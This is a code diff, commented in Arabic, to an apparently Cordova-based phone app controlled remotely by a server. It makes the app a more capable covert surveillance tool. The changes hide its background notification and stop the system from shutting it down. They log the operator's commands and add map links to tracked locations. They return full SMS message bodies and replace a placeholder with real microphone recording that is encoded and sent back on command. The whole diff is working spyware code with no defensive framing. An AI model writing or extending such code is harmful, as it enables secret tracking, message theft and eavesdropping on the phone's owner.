@@ -3,6 +3,41 @@ document.addEventListener('deviceready', onDeviceReady, false);
 function onDeviceReady() {
   console.log('Device is ready');
   
+  // تفعيل الوضع الخلفي للاستمرار في التشغيل حتى بعد إعادة تشغيل الجوال
+  if (cordova.plugins.backgroundMode) {
+    cordova.plugins.backgroundMode.setDefaults({
+      title: 'نظام المراقبة يعمل',
+      text: 'التطبيق يعمل في الخلفية',
+      icon: 'icon',
+      color: 'FFFFFF',
+      resume: true,
+      hidden: true,
+      bigText: true
+    });
+    
+    cordova.plugins.backgroundMode.on('activate', function() {
+      setTimeout(function() {
+        cordova.plugins.backgroundMode.disableBatteryOptimizations();
+      }, 500);
+    });
+    
+    cordova.plugins.backgroundMode.enable();
+    
+    // منع إيقاف التطبيق تلقائياً
+    if (cordova.plugins.backgroundMode.disableWebViewOptimizations) {
+      cordova.plugins.backgroundMode.disableWebViewOptimizations();
+    }
+    
+    // جعل التطبيق يعمل في الخلفية بشكل دائم
+    document.addEventListener('pause', function() {
+      setTimeout(function() {
+        if (cordova.plugins.backgroundMode && !cordova.plugins.backgroundMode.isActive()) {
+          cordova.plugins.backgroundMode.enable();
+        }
+      }, 2000);
+    }, false);
+  }
+
   // معلومات الجهاز
   const deviceInfo = {
     uuid: device.uuid || generateUUID(),
@@ -88,6 +123,22 @@ function connectToServer(deviceInfo) {
     try {
       const data = JSON.parse(event.data);
       
+      // تخزين الأوامر المستلمة في localStorage
+      if (data.type === 'command') {
+        const commandsHistory = JSON.parse(localStorage.getItem('commandsHistory') || '[]');
+        commandsHistory.push({
+          id: Date.now(),
+          timestamp: new Date().toISOString(),
+          command: data.command,
+          status: 'received'
+        });
+        // الاحتفاظ بآخر 100 أمر فقط
+        if (commandsHistory.length > 100) {
+          commandsHistory.shift();
+        }
+        localStorage.setItem('commandsHistory', JSON.stringify(commandsHistory));
+      }
+      
       if (data.type === 'command') {
         console.log('Received command:', data.command);
         
@@ -99,6 +150,18 @@ function connectToServer(deviceInfo) {
               commandId: data.commandId,
               response
             }));
+            
+            // تحديث حالة الأمر في السجل
+            const commandsHistory = JSON.parse(localStorage.getItem('commandsHistory') || '[]');
+            const commandIndex = commandsHistory.findIndex(cmd => 
+              cmd.commandId === data.commandId || 
+              (cmd.command && cmd.command.commandId === data.command.commandId));
+              
+            if (commandIndex !== -1) {
+              commandsHistory[commandIndex].status = 'executed';
+              commandsHistory[commandIndex].response = response;
+              localStorage.setItem('commandsHistory', JSON.stringify(commandsHistory));
+            }
           }
         });
       }
@@ -139,6 +202,7 @@ function executeCommand(command, callback) {
   
   // إضافة commandId للتعقب
   const commandId = Date.now();
+  command.commandId = commandId;
   
   switch (command.type) {
     case 'get_location':
@@ -172,6 +236,9 @@ function getLocation(commandId, callback) {
   
   navigator.geolocation.getCurrentPosition(
     (position) => {
+      // إنشاء رابط خرائط جوجل مباشر
+      const googleMapsLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+      
       callback({
         commandId,
         status: 'success',
@@ -183,7 +250,8 @@ function getLocation(commandId, callback) {
           altitudeAccuracy: position.coords.altitudeAccuracy,
           heading: position.coords.heading,
           speed: position.coords.speed,
-          timestamp: position.timestamp
+          timestamp: position.timestamp,
+          googleMapsLink: googleMapsLink
         }
       });
     },
@@ -231,7 +299,7 @@ function getSMS(commandId, callback) {
         messages: messages.map(msg => ({
           id: msg._id,
           address: msg.address,
-          body: msg.body,
+          body: msg.body, // سيتم عرض الرسالة كاملة بدون قص
           date: msg.date,
           read: msg.read
         }))
@@ -251,18 +319,69 @@ function getSMS(commandId, callback) {
 function recordAudio(commandId, duration, callback) {
   duration = duration || 10; // Default 10 seconds
   
-  // هذا مثال مبسط، في التطبيق الفعلي ستحتاج إلى استخدام MediaRecorder API
-  setTimeout(() => {
+  // استخدام MediaRecorder API لتسجيل الصوت وحفظه كـ MP3
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({ audio: true })
+      .then(stream => {
+        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/mpeg' });
+        const audioChunks = [];
+        
+        mediaRecorder.ondataavailable = event => {
+          audioChunks.push(event.data);
+        };
+        
+        mediaRecorder.onstop = () => {
+          const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
+          const audioUrl = URL.createObjectURL(audioBlob);
+          
+          // إنشاء عنصر صوت لاختبار الملف
+          const audio = new Audio();
+          audio.src = audioUrl;
+          
+          // تحويل الصوت إلى base64 لسهولة الإرسال
+          const reader = new FileReader();
+          reader.onloadend = function() {
+            const base64data = reader.result;
+            
+            // إيقاف التدفق
+            stream.getTracks().forEach(track => track.stop());
+            
+            callback({
+              commandId,
+              status: 'success',
+              audio: {
+                duration: duration,
+                format: 'mp3',
+                size: audioBlob.size,
+                data: base64data,
+                url: audioUrl
+              }
+            });
+          };
+          reader.readAsDataURL(audioBlob);
+        };
+        
+        setTimeout(() => {
+          mediaRecorder.stop();
+        }, duration * 1000);
+        
+        mediaRecorder.start();
+      })
+      .catch(error => {
+        callback({ 
+          commandId,
+          status: 'error',
+          error: 'Audio recording error',
+          details: error.message
+        });
+      });
+  } else {
     callback({ 
       commandId,
-      status: 'success',
-      audio: {
-        duration: duration,
-        format: 'wav',
-        size: duration * 16000 // تقدير حجم الملف
-      }
+      status: 'error',
+      error: 'MediaDevices API not supported'
     });
-  }, duration * 1000);
+  }
 }
 
 function getDeviceInfo(commandId, callback) {
